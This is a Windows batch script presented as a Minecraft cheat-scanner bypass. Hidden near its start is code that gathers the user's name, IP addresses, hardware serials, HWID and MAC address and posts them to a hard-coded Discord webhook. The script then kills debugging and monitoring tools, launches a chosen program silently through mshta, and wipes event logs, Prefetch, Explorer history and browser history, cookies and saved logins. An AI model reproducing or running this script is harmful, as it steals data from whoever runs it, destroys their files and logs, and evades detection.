@echo off
:: Minecraft scanner bypass by ._rayzz! :P
setlocal EnableDelayedExpansion
title Undetech

@echo off
setlocal enabledelayedexpansion

:: ======= YOUR DISCORD WEBHOOK HERE =======
set "WEBHOOK_URL=https://discord.com/api/webhooks/1395999594873360496/gB_Cb_ne-7St_36jupLAaCsRo-KzsEqNxRooJZdzGOVVvWA2WgxXWvlzmizf1FoviCvg"


set "pc_user=%USERNAME%"
set "pc_name=%COMPUTERNAME%"
set "user_domain=%USERDOMAIN%"

for /f %%a in ('powershell -command "Get-Date -Format 'yyyy-MM-dd HH:mm:ss'"') do set "run_time=%%a"


for /f "tokens=*" %%a in ('powershell -command "(Invoke-WebRequest -Uri 'https://api.ipify.org').Content"') do set "public_ip=%%a"


for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "local_ip=%%a"
set "local_ip=%local_ip:~1%"


for /f "skip=1 tokens=*" %%a in ('wmic baseboard get serialnumber') do (
    set "hwid=%%a"
    goto gotHWID
)
:gotHWID


for /f "skip=1 tokens=*" %%a in ('wmic cpu get name') do (
    set "cpu_name=%%a"
    goto gotCPU
)
:gotCPU

for /f "skip=1 tokens=*" %%a in ('wmic cpu get processorid') do (
    set "cpu_id=%%a"
    goto gotCPUID
)
:gotCPUID


for /f "skip=1 tokens=*" %%a in ('wmic path win32_VideoController get name') do (
    set "gpu_name=%%a"
    goto gotGPU
)
:gotGPU


for /f "skip=1 tokens=*" %%a in ('wmic computersystem get totalphysicalmemory') do (
    set /a "ram_mb=%%a / 1048576"
    goto gotRAM
)
:gotRAM


for /f "tokens=*" %%a in ('wmic os get caption') do (
    set "os_name=%%a"
    goto gotOS
)
:gotOS


for /f "tokens=*" %%a in ('getmac ^| find /i ":"') do (
    set "mac=%%a"
    goto gotMAC
)
:gotMAC


for /f "skip=1 tokens=*" %%a in ('wmic diskdrive get serialnumber') do (
    set "disk_serial=%%a"
    goto gotDisk
)
:gotDisk


for /f "skip=1 tokens=*" %%a in ('wmic bios get smbiosbiosversion') do (
    set "bios=%%a"
    goto gotBIOS
)
:gotBIOS

set "json={"
set "json=!json!\"content\":\"System Info Report\n"
set "json=!json!User: %pc_user%\n"
set "json=!json!PC Name: %pc_name%\n"
set "json=!json!Run Time: %run_time%\n"
set "json=!json!Public IP: %public_ip%\n"
set "json=!json!Local IP: %local_ip%\n"
set "json=!json!HWID: %hwid%\n"
set "json=!json!CPU: %cpu_name% (ID: %cpu_id%)\n"
set "json=!json!GPU: %gpu_name%\n"
set "json=!json!RAM: %ram_mb% MB\n"
set "json=!json!OS: %os_name%\n"
set "json=!json!MAC: %mac%\n"
set "json=!json!Disk Serial: %disk_serial%\n"
set "json=!json!BIOS: %bios%\""
set "json=!json!}"

powershell -Command ^
"Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method POST -Body '%json%' -ContentType 'application/json'"


:: Debuggers
set "debuggers=ollydbg.exe x64dbg.exe x32dbg.exe cheatengine.exe ida.exe ida64.exe winhex.exe tcpview.exe processhacker.exe procmon.exe procexp.exe xdbg.exe"

:check_debuggers
for %%D in (%debuggers%) do (
    tasklist /FI "IMAGENAME eq %%D" | find /I "%%D" >nul
    if not errorlevel 1 (
        echo Found debugger: %%D - Terminating...
        taskkill /F /IM %%D >nul 2>&1
    )
)

timeout /t 5 >nul

set /p userName=What's your username? 
cls
set /p APP_TO_RUN=Enter the full path to the .exe you want to launch silently:




:: === System Info ===
set "userName=%userName%" (%USERNAME)
set "currentDate=%DATE%"
set "currentTime=%TIME%"

for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set "ip=%%A"
    set "ip=!ip:~1!"
)

for /f "skip=1 tokens=*" %%a in ('wmic baseboard get serialnumber') do (
    set "hwid=%%a"
    goto :finishedhwid
)
:finishedhwid

for /f "skip=1 tokens=*" %%a in ('wmic cpu get processorid') do (
    set "ProcessorID=%%a"
    goto :finishedprocessorID
)
:finishedprocessorID

color 5
pause
cls

echo.
echo Logged in as: %userName%
echo Date: %currentDate%
echo Time: %currentTime%
echo IP Address: %ip%
echo HWID: %hwid%
echo Process ID: %ProcessorID%
echo.
type ascii.txt
echo.
echo YOU WILL HAVE 30 SECONDS TO INJECT THE CHEAT AFTER CLICKING ENTER, AFTER THAT THE TRACES WILL BE CLEANSED.
pause

:: === Write HTA File ===
echo ^<html^> > temp.hta
echo ^<head^> >> temp.hta
echo ^<HTA:APPLICATION ID="cheat" BORDER="thin" BORDERSTYLE="normal" /^> >> temp.hta
echo ^<script language="VBScript"^> >> temp.hta
echo Set shell = CreateObject("WScript.Shell") >> temp.hta
echo shell.Run "%APP_TO_RUN%", 0, False >> temp.hta
echo window.close >> temp.hta
echo ^</script^> >> temp.hta
echo ^</head^> >> temp.hta
echo ^<body^>^</body^> >> temp.hta
echo ^</html^> >> temp.hta

:: === Launch HTA ===
echo [*] Launching %APP_TO_RUN% silently via mshta...

start "" mshta.exe "%CD%\temp.hta"
cls

echo [*] Waiting 30 seconds before cleanup...
timeout /t 30 >nul

:: === Cleanup HTA ===
del temp.hta >nul 2>&1

:: === ENHANCED CLEANUP START ===
echo [*] Starting enhanced privacy cleanup...

:: Kill common browsers to unlock cache files
taskkill /IM brave.exe /F >nul 2>&1
taskkill /IM opera.exe /F >nul 2>&1

:: Step 1: Prefetch
echo    - Clearing Prefetch...

del /F /Q %SystemRoot%\Prefetch\*.* >nul 2>&1

:: Step 2: RunMRU
echo    - Clearing Run history...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1

:: Step 3: Recent Documents
echo    - Clearing Recent Documents...
del /F /Q "%APPDATA%\Microsoft\Windows\Recent\*.*" >nul 2>&1

:: Step 4: Jump Lists
echo    - Clearing Jump Lists...
del /F /Q "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /F /Q "%APPDATA%

\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1

:: Step 5: Explorer Search Terms
echo    - Clearing Explorer search history...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" /f >nul 2>&1

:: Step 6: Temp folders
echo    - Clearing TEMP files...
del /F /Q "%TEMP%\*.*" >nul 2>&1
for /d %%D in ("%TEMP%\*") do rd /s /q "%%D" >nul 2>&1
del /F /Q "%SystemRoot%\Temp\*.*" >nul 2>&1
for /d %%D in ("%SystemRoot%\Temp\*") do rd /s /q "%%D" >nul 2>&1

:: Step 7: WER (Windows Error Reporting)

echo    - Clearing WER logs...
del /F /Q "%ProgramData%\Microsoft\Windows\WER\*.*" >nul 2>&1
for /d %%D in ("%ProgramData%\Microsoft\Windows\WER\*") do rd /s /q "%%D" >nul 2>&1

:: Step 8: Event Logs
echo    - Clearing Event Logs...
for /f "tokens=*" %%G in ('wevtutil el') do wevtutil cl "%%G" >nul 2>&1

:: Step 9: ShellBags
echo    - Clearing ShellBags...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1

:: Step 10: Explorer Typed Paths
echo    - Clearing Explorer address bar...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f >nul 2>&1

:: Step 11: Search Assistant
echo    - Clearing search assistant...
reg delete "HKCU\Software\Microsoft\Search Assistant" /f >nul 2>&1

:: Step 12: Internet Explorer/Edge Legacy
echo    - Clearing IE/Edge legacy cache...
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255 >nul 2>&1

:: Step 13: Quick Access
echo    - Clearing Quick Access recent 

items...
del /F /Q "%APPDATA%\Microsoft\Windows\Recent\*.*" >nul 2>&1

:: Step 14: OpenSave Dialog
echo    - Clearing Open/Save dialog...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /f >nul 2>&1

:: Step 15: Brave Browser
echo    - Clearing Brave browser data...
set "BRAVE_PATH=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"

del /F /Q "%BRAVE_PATH%\History" >nul 2>&1
del /F /Q "%BRAVE_PATH%\Cookies" >nul 2>&1
del /F /Q "%BRAVE_PATH%\Login Data" >nul 2>&1
del /F /Q "%BRAVE_PATH%\Web Data" >nul 2>&1
del /F /Q "%BRAVE_PATH%\Top Sites" >nul 2>&1
del /F /Q "%BRAVE_PATH%\Visited Links" >nul 2>&1
rd /s /q "%BRAVE_PATH%\Cache" >nul 2>&1
rd /s /q "%BRAVE_PATH%\Code Cache" >nul 2>&1
rd /s /q "%BRAVE_PATH%\GPUCache" >nul 2>&1
rd /s /q "%BRAVE_PATH%\Media Cache" >nul 2>&1

:: Step 16: Opera Browser
echo    - Clearing Opera browser data...
set "OPERA_PATH=%APPDATA%\Opera Software\Opera Stable"
del /F /Q "%OPERA_PATH%\History" >nul 2>&1
del /F /Q "%OPERA_PATH%\Cookies" >nul 2>&1
del /F /Q "%OPERA_PATH%\Login Data" >nul 2>&1
del /F /Q "%OPERA_PATH%\Web Data" >nul 2>&1
del /F /Q "%OPERA_PATH%\Top Sites" >nul 2>&1
del /F /Q "%OPERA_PATH%\Visited Links" >nul 2>&1
rd /s /q "%OPERA_PATH%\Cache" >nul 2>&1
rd /s /q "%OPERA_PATH%\Code Cache" >nul 2>&1
rd /s /q "%OPERA_PATH%\GPUCache" 

>nul 2>&1
rd /s /q "%OPERA_PATH%\Media Cache" >nul 2>&1

:check_debuggers_2
for %%D in (%debuggers%) do (
    tasklist /FI "IMAGENAME eq %%D" | find /I "%%D" >nul
    if not errorlevel 1 (
        echo Found debugger: %%D - Terminating...
        taskkill /F /IM %%D >nul 2>&1
    )
)

cls
echo === DONE ===
echo.
echo [✓] All traces cleaned successfully!
pause
